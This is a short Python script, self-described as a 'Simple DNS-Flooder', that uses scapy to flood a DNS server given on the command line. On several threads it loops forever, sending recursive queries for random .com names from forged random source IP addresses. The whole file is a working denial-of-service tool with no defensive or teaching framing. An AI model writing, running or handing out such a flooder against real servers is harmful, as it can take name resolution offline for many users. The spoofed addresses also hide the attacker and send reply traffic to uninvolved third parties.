#!./env/bin/python3

from scapy.all import *
from time import sleep
import random
import string
import threading
import argparse

# init option parser
parser = argparse.ArgumentParser(description='Simple DNS-Flooder')
parser.add_argument("-s", "--server", help='DNS-Server IP Address', required=True)
parser.add_argument("-t", "--threads", type=int, help='Threads to use', required=True)
args = parser.parse_args()

# perform dns query
def perform_query(dns, domain, sourceIP):
    packet = IP(src=sourceIP, dst=dns) / UDP() / DNS(rd=1, qd=DNSQR(qname=domain))
    send(packet)

# randomized Domain
def getRandDomain():
   letters = string.ascii_lowercase
   return ''.join(random.choice(letters) for i in range(6))

# randomized IP
def getRandomIP():
    genIP = f"{random.randint(1,250)}.{random.randint(1,250)}.{random.randint(1,250)}.{random.randint(1,250)}"
    return genIP

# flood
def flood(): 
    while True:
        global answ
        domainToUse = getRandDomain()
        ipToUse = getRandomIP()
        try:
            answ = perform_query(args.server, f"{domainToUse}.com", ipToUse)
        except:
            domainToUse = getRandDomain()

# start threads
def startThreads():
    threads = int(args.threads)
    for i in range(1,threads):
        t = threading.Thread(target=flood)
        t.start()

# start here
print("RUN AS ROOT!")
sleep(2)
print(f"Starting Flood of {args.server} with {args.threads} Threads in 3 seconds ...")
sleep(3)
startThreads()